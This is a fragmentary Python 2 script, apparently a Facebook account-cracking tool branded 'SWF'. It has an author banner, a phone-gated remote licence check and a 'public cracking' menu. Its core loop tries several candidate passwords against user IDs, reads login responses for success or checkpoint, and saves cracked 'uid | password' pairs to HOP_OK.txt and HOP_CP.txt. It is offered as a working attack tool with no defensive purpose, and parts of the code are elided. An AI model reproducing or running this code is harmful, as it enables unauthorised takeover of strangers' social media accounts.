...
┈┈▕┈┈┈┃┃┈┈┈▏━╯┈┈┈┈┈
┈┈▕┈┈┈╰╯┈┈┈▏┈┈┈┈┈┈┈
┈┈▕╱╲╱╲╱╲╱╲▏┈┈┈┈┈┈┈ \n\x1b[1;91m-----------------------------------------------\n\x1b[1;97m\xe2\x9e\xa3 Author : SWF OWNER MONU RAJA\n\x1b[1;97m\xe2\x9e\xa3 Github : https://github.com/monuraja123\n\x1b[1;97m\xe2\x9e\xa3 WP NO: +9779845527904\n\x1b[1;91m-----------------------------------------------'
...
def reg():
    ...
    r = requests.get('https://raw.githubusercontent.com/monuraja123/monuraja/main/server.txt').text
    if to in r:
        ...
        os.system('xdg-open https://wa.me/+9779845527904')
        reg()
...
def menu():
    ...
    print '\x1b[1;92m[6] Youtube MP CREATION'
    menu_s()
...
def a_s():
    ...
    if a_s == '1':
        os.system('clear')
        print logo
        print '\x1b[1;93m~~~~ SWF public cracking ~~~~\x1b[1;91m'
        print 47 * '-'
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;94mMONU RAJA SWF Kings Of Facebook\x1b[1;91m'
    print 47 * '-'
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[SWF-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;31;1m[SWF-CP] ' + uid + ' | ' + pass1
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[SWF-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;31;1m[SWF-CP] ' + uid + ' | ' + pass2
                    cp = open('HOP_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[SWF-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;31;1m[SWF-CP] ' + uid + ' | ' + pass3
                        cp = open('HOP_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[SWF-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;31;1m[SWF-CP] ' + uid + ' | ' + pass4
                            cp = open('HOP_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
...
def c_s():
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;94mMONU RAJA SWF Kings Of Fcebook\x1b[1;91m'
    print 47 * '-'
